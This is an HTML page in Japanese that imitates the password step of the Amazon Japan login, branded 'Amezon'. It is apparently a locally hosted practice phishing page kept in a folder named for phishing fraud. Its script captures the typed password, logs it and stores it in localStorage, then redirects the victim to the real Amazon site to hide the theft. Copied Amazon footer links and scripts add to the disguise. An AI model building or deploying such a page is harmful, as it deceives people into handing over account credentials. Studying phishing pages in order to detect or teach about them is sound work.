<!DOCTYPE html>
<html lang="ja">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="Amezon2.css">
    <title>Amazonログイン</title>

    <script>
        // localStorageから保存されたデータを取得して表示
        window.onload = function () {
            const savedText = localStorage.getItem("savedText");
            if (savedText) {
                document.getElementById("displayText").textContent = savedText;
            } else {
                document.getElementById("displayText").textContent = "データがありません。";
            }
        }

        function saveDataAndGoNext() {
            const password = document.getElementById("inputPassword").value;

            console.log(password);
            // localStorageにパスワードを保存
            localStorage.setItem("savedPassword", password);

            // 次のページにリダイレクト
            window.location.href = "https://www.amazon.co.jp/";
        }
    </script>
</head>

<body>
    <div class="image-text">
        <!-- <a href="http://127.0.0.1:5500/フィッシング詐欺/page.html"> -->
        <img src="amezon5.png" alt="Amazon ロゴ">.co.jp
    </div>

    <div class="container2">
        <div class="text">
            <h1>
                ログイン
            </h1>
            <div>
                <p id="displayText" style="display: inline; margin-right: 10px;"></p>
                <a id="ap_change_login_claim" href="http://127.0.0.1:5500/フィッシング詐欺/Amezon.html">変更</a>
            </div>
            <div>
                <label for="inputPassword"> パスワード
                    <span class="spacing"> </span>
                    <a
                        href="https://www.amazon.co.jp/ap/forgotpassword?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&signInRedirectToFPPThreshold=5&pageId=jpflex&useSHuMAWorkflow=false&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%3Fref_%3Dnav_signin&prevRID=4YVFZJZC0EN36C3Z3ERB&openid.assoc_handle=jpflex&openid.mode=checkid_setup&failedSignInCount=0&ref_=ap_pwd_change&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&timestamp=1730379684000">パスワードを忘れた方</a>
                    <input type="password" id="inputPassword" />
                    <!-- ボタン -->
                    <a href="#" class="btn" onclick="saveDataAndGoNext()">ログイン</a>
                </label>
            </div>
        </div>
    </div>

    <span class="spacing"> </span>

    <footer>
        <span class="auth-footer-seperator"></span>

        <ul>

            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">

                <a class="a-link-normal a-nowrap" target="_blank"
                    href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">
                    利用規約
                </a>
                <span class="auth-footer-seperator"></span>
            </li>

            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">


                <a class="a-link-normal a-nowrap" target="_blank"
                    href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">
                    プライバシー規約
                </a>
                <span class="auth-footer-seperator"></span>
            </li>

            <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">


                <a class="a-link-normal a-nowrap" target="_blank" href="https://www.amazon.co.jp/help">
                    ヘルプ
                </a>
                <span class="auth-footer-seperator"></span>
            </li>

        </ul>

        <script type="text/javascript">
            try {
                var metadataList = document.getElementsByName('metadata1');
                if (metadataList.length == 0) {
                    var input = document.createElement('input');
                    input.name = 'metadata1';
                    input.type = 'hidden';
                    input.value = 'true';

                    var authenticationFormList = document.getElementsByName('signIn');
                    for (var index = 0; index < authenticationFormList.length; index++) {
                        authenticationFormList[index].appendChild(input);
                    }
                } else {
                    for (var index = 0; index < metadataList.length; index++) {
                        metadataList[index].value = 'true';
                    }
                }
            } catch (e) {
                if (typeof window.ueLogError === 'function') {
                    window.ueLogError(e, {
                        message: 'Failed to populate default metadata value',
                        logLevel: 'warn',
                        attribution: 'FWCIMAssets'
                    });
                }
            }
        </script>
        <script type="text/javascript">
            window.fwcimCmd = [

                ['profile', 'signIn']


            ];
        </script>

        <span class="a-size-mini a-color-secondary">
            &copy; 1996-2024, Amezon.com, Inc. またはその関連会社
        </span>
    </footer>
</body>

</html>
